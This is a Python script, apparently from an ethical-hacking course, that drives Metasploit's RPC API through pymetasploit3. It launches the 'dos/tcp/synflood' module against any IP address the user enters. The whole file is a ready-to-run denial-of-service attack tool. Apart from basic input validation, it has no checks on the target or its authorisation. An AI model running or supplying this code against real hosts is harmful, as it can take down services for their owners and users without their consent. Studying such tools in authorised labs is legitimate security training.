#******************************************************************************************************************
#Curso "Python para hacking ético" Tknika 2022/2023
#RESUMEN DEL SCRIPT:
#Atención: antes de ejecutar el script, tendrás que poner en marcha el servicor RPC desde la consola:#
#    $sudo msfconsole
#    $load msgrpc Pass=python
#    Fíjate bien en el puerto que queda abierto (normalmente, 55552):
#           [*] MSGRPC Service:  127.0.0.1:55552 
#           [*] MSGRPC Username: msf
#           [*] MSGRPC Password: python
#           [*] Successfully loaded plugin: msgrpc
# También tendrás que instalar la librería pymetasploit3 con privilegios:
# Este script realiza un ataque DoS contra el puerto 80 de la IP indicada por el usuario.
#******************************************************************************************************************
from pymetasploit3.msfrpc import *
import ipaddress, time
#import keyboard
#Función para validar si la IP introducida por el usuario es correcta
def validar_destino(direccion_destino):
    try:
        ipaddress.ip_address(direccion_destino)
        return True 
    except ValueError:
        return False

#Función que comprueba si un valor es un puerto válido: está vacío (puerto por defecto) o está entre 1 y 65535
def validar_puerto(puerto):
    if puerto=="":
        return True
    else:
        try:
            puerto_destino = int(puerto)
            if 1 <= puerto_destino <= 65535:
                return True
            else:
                return False
        except ValueError:
            return False

#Función para solicitar al usuario que introduzca los datos que vamos a necesitar para conectarnos al servidor ssh: IP, puerto de destino, y usuario. 
def solicitar_datos_usuario():
    try:
        destino_correcto=False
        puerto_correcto=False
        password_correcta=False
        while not destino_correcto:
            destino = input('>> Introduce la dirección del host objetivo (IP o nombre de host): ')
            if validar_destino(destino):
                destino_correcto=True
        while not puerto_correcto:
            puerto = input('>> Introduce el puerto en el que realizar la conexión RPC, entre 1 y 65535 por defecto, 55552): ')
            if validar_puerto(puerto):
                puerto_correcto=True
                if puerto=="":
                    puerto = 55552
        while not password_correcta:
            password = input('>> Introduce la contraseña para conectarte con el servidor RPC : ')
            if password != "":
                password_correcta=True
    except ValueError:
        print ("Ha ocurrido un error inesperado...")
    return destino,puerto,password

if __name__ == '__main__':
    try:
        #Solicitamos al usuario que introduzca los datos que necesitamos, guardándolos en las variables pertinentes#Solicitamos al usuario que introduzca los datos que necesitamos, guardándolos en las variables pertinentes
        ip,puerto_rpc,contrasena=solicitar_datos_usuario()
        #Creamos el objeto "cliente_rpc" de la clase MsfRpcClient para establecer una conexión con el servidor de Metasploit Framework (MSF) a través de su API RPC (Remote Procedure Call)
        cliente_rpc = MsfRpcClient(contrasena, port=int(puerto_rpc))
        #Indicamos el módulo  que vamos a utilizar. Será de tipo auxiliary, y su nombre es 'dos/tcp/synflood'. La variable "exploit" será de tipo AuxiliaryModule, clase de MSF que representa
        #un módulo de tipo auxiliar. Es decir, toda la información del módulo se cargará en la variable "exploit". 
        exploit = cliente_rpc.modules.use('auxiliary', 'dos/tcp/synflood')
        #Asignamos al parámetro RHOSTS (Remote hosts) la IP de la víctima
        exploit['RHOSTS']=str(ip)
        #Lanzamos el módulo
        exploit.execute()
        #Damos un margen de 2 segundos
        time.sleep(2)
        print("Se está efectuando el SYN Flood")
        input("Pulsa una tecla para detenerlo")
        # Cerrar la conexión RPC
        cliente_rpc.logout()

        print("SYN Flood detenido.")
       
    except Exception as error:
        print (f"Ha ocurrido un error: {error}")
